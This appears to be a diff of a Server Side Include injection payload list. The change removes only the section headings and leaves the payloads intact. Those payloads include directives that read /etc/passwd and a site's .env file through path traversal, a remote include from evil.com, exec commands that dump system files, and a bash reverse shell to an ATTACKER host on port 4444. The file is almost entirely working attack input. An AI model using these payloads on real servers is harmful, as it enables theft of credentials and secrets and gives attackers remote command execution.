@@ -1,8 +1,3 @@
-# ============================================================
-# Server Side Include (SSI) Injection — Payloads
-# ============================================================
-
-# ---- Detection ----
 <!--#echo var="DATE_LOCAL" -->
 <!--#echo var="DOCUMENT_NAME" -->
 <!--#echo var="DOCUMENT_URI" -->
@@ -11,17 +6,14 @@
 <!--#echo var="QUERY_STRING_UNESCAPED" -->
 <!--#printenv -->
 
-# ---- File Inclusion ----
 <!--#include file="etc/passwd" -->
 <!--#include virtual="/etc/passwd" -->
 <!--#include file="../../../etc/passwd" -->
 <!--#include virtual="/var/www/html/.env" -->
 <!--#include file="secret.conf" -->
 
-# ---- Remote Include (if SSI remote enabled) ----
 <!--#include virtual="https://evil.com/payload.txt" -->
 
-# ---- Command Execution ----
 <!--#exec cmd="id" -->
 <!--#exec cmd="cat /etc/passwd" -->
 <!--#exec cmd="ls -la" -->
@@ -29,28 +21,23 @@
 <!--#exec cmd="bash -i >& /dev/tcp/ATTACKER/4444 0>&1" -->
 <!--#exec cgi="/cgi-bin/shell.cgi" -->
 
-# ---- Config Directives ----
 <!--#config timefmt="%A %B %d, %Y" -->
 <!--#config sizefmt="bytes" -->
 <!--#config errmsg="[error]" -->
 
-# ---- Environment Variables ----
 <!--#echo var="HTTP_USER_AGENT" -->
 <!--#echo var="HTTP_REFERER" -->
 <!--#echo var="HTTP_COOKIE" -->
 <!--#echo var="REMOTE_ADDR" -->
 <!--#echo var="REQUEST_METHOD" -->
 
-# ---- Set Variables ----
 <!--#set var="myvar" value="test" -->
 <!--#echo var="myvar" -->
 
-# ---- Conditional ----
 <!--#if expr="$QUERY_STRING" -->
 <!--#echo var="QUERY_STRING" -->
 <!--#endif -->
 
-# ---- File Extensions Enabling SSI ----
 .shtml
 .stm
 .shtm
